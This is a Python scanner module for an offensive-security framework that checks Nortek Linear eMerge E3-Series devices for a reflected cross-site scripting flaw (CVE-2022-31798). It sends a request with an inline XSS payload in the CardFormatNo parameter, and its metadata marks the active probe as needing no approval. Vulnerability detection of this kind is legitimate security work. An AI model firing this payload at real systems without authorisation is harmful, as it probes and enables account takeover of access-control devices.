#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is a local session fixation vulnerability that, when chained with cross-site scripting, leads to account."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Nortek Linear eMerge E3-Series - Cross-Site Scripting Detection',
        'description': 'There is a local session fixation vulnerability that, when chained with cross-site scripting, leads to account take over of admin or a lower privileged user.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'emerge', 'nortek', 'xss', 'packetstorm', 'nortekcontrol', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/167992/',
            'http://packetstormsecurity.com/files/167992/Nortek-Linear-eMerge-E3-Series-Account-Takeover.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-31798',
            'https://eg.linkedin.com/in/omar-1-hashem',
            'https://gist.github.com/omarhashem123/bccdcec70ab7e8f00519d56ea2e3fd79',
        ],
        'cve': 'CVE-2022-31798',
    }

    def run(self):
        r = self.http_request(method="GET", path='/card_scan.php?No=0000&ReaderNo=0000&CardFormatNo=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = (',"CardFormatNo":"<img src=x onerror=alert(document.domain)>"}',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Nortek Linear eMerge E3-Series - Cross-Site Scripting detected",
                path='/card_scan.php?No=0000&ReaderNo=0000&CardFormatNo=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E',
            )
            return True
        return False

